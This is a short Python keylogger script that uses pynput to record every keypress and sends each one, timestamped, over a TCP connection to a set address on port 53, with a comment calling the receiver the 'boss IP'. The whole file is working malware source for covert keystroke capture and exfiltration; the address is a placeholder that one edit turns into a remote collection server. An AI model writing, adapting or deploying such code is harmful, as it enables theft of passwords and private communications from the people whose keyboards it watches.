# importing libraries
from pynput.keyboard import Key, Listener
import socket
import datetime

THIS_PC_IP = socket.gethostbyname(socket.gethostname())
SEND_IP = "127.0.0.1"
PORT = 53

# this function sniffs packets and sends them to the boss IP
def sendKey(key):

    # Connecting to remote adress
    server_address = (SEND_IP, PORT)

    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(server_address)

    # Sending data to server
    msg = str(datetime.datetime.now()) + " -- " + str(key) + "\n"
    print(msg)

    sock.sendall(msg.encode())

    # Closing the socket
    sock.close()
    print('{0} sent'.format(key))

with Listener(on_press=sendKey) as listener: listener.join()
